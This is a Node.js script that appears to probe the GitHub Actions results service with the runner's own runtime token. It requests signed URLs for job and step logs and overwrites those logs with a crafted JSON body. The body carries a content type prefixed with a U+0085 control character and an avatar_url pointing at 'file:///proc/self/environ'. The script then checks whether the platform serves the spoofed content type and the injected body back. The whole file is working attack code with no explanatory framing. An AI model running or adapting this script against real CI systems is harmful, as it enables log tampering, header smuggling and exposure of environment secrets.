import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {getResultsServiceUrl} from '../node_modules/@actions/artifact/lib/internal/shared/config.js';

const rt=process.env.ACTIONS_RUNTIME_TOKEN||'';
const claims=JSON.parse(Buffer.from(rt.split('.')[1],'base64url').toString());
const scp=claims.scp||'';
const m=new RegExp('Actions\\.Results:([^: ]+):([^ ]+)').exec(scp);
const runBackend=m?m[1]:null, jobBackend=m?m[2]:null;
const repo=process.env.GITHUB_REPOSITORY, runId=process.env.GITHUB_RUN_ID, token=process.env.GITHUB_TOKEN, jobKey=process.env.GITHUB_JOB;
const odd='\u0085application/json';
const body=Buffer.from(JSON.stringify({full_name:'x/'+repo,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'logmime',stargazers_count:0}));

function req(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const t=new URL(url);const mod=t.protocol==='https:'?https:http;
    const r=mod.request(t,{method,headers,timeout:25000},res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(c)}));});
    r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();
  });
}
const base=getResultsServiceUrl();
async function twirp(method, payload){
  const url=new URL(`/twirp/results.services.receiver.Receiver/${method}`, base).href;
  const r=await req(url,'POST',Buffer.from(JSON.stringify(payload)),{Authorization:`Bearer ${rt}`,'Content-Type':'application/json',Accept:'application/json'});
  let j=null;try{j=JSON.parse(r.body.toString())}catch{}
  return {status:r.status,body:j,raw:r.body.toString().slice(0,400)};
}
async function upload(url,bytes,ct){
  const b=new BlobClient(url).getBlockBlobClient();
  await b.uploadData(bytes,{blobHTTPHeaders:{blobContentType:ct}});
}
function ctHex(h){return h?Buffer.from(h,'latin1').toString('hex'):null;}

const out={runBackend,jobBackend,base,repo,runId,jobKey};
// try snake and camel
const payloads={snake:{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend},camel:{workflowRunBackendId:runBackend,workflowJobRunBackendId:jobBackend}};
for(const [k,p] of Object.entries(payloads)){
  out['get_'+k]=await twirp('GetJobLogsSignedBlobURL',p);
}
let logsUrl=null;
for(const k of ['snake','camel']){const v=out['get_'+k];if(v&&v.body){logsUrl=v.body.logs_url||v.body.logsUrl||v.body.url||null; if(logsUrl)break;}}
out.logsUrlHost=logsUrl?new URL(logsUrl).host:null; out.logsUrlPath=logsUrl?new URL(logsUrl).pathname:null;

if(logsUrl){
  try{ await upload(logsUrl,body,odd); out.upload= 'ok'; }catch(e){ out.upload='ERR '+String(e.message).slice(0,200); }
  // metadata snake/camel
  const stamp=new Date().toISOString();
  out.meta_snake=await twirp('CreateJobLogsMetadata',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend,uploaded_at:stamp,line_count:1});
  // find github job id
  const jobs=await req(`https://api.github.com/repos/${repo}/actions/runs/${runId}/jobs?per_page=100`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'logmime'});
  let jobsJson=null;try{jobsJson=JSON.parse(jobs.body.toString())}catch{}
  const job=(jobsJson?.jobs||[]).find(x=>x.name===jobKey||x.name.endsWith('/'+jobKey))||(jobsJson?.jobs||[])[0];
  out.jobId=job?.id;
  if(out.jobId){
    const u=`https://api.github.com/repos/${repo}/actions/jobs/${out.jobId}/logs`;
    const r1=await req(u,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'logmime'});
    out.restStatus=r1.status;out.locHost=r1.headers.location?new URL(r1.headers.location).host:null;
    if(r1.headers.location){
      const loc=new URL(r1.headers.location);out.locRsct=loc.searchParams.get('rsct');out.locPath=loc.pathname;
      const r2=await req(r1.headers.location);
      out.finalStatus=r2.status;out.finalCtHex=ctHex(r2.headers['content-type']);out.finalCtCount=r2.rawHeaders.reduce((n,v,i)=>i%2===0&&String(v).toLowerCase()==='content-type'?n+1:n,0);out.bodyMatch=r2.body.equals(body);
    }
  }
}
// step logs with random and job-like guids
const g1='00000000-0000-4000-8000-000000000001';
out.step_get=await twirp('GetStepLogsSignedBlobURL',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend,step_backend_id:g1});
const stepUrl=out.step_get?.body?(out.step_get.body.logs_url||out.step_get.body.logsUrl||null):null;
out.stepUrlHost=stepUrl?new URL(stepUrl).host:null;out.stepUrlPath=stepUrl?new URL(stepUrl).pathname:null;out.stepUrlSearch=stepUrl?new URL(stepUrl).search.slice(0,300):null;
if(stepUrl){try{await upload(stepUrl,body,odd);out.stepUpload='ok';}catch(e){out.stepUpload='ERR '+String(e.message).slice(0,200);}}
out.step_meta=await twirp('CreateStepLogsMetadata',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend,step_backend_id:g1,uploaded_at:new Date().toISOString(),line_count:1});
// step summary
out.sum_get=await twirp('GetStepSummarySignedBlobURL',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend,step_backend_id:g1});
console.log('LOGMIME',JSON.stringify(out));
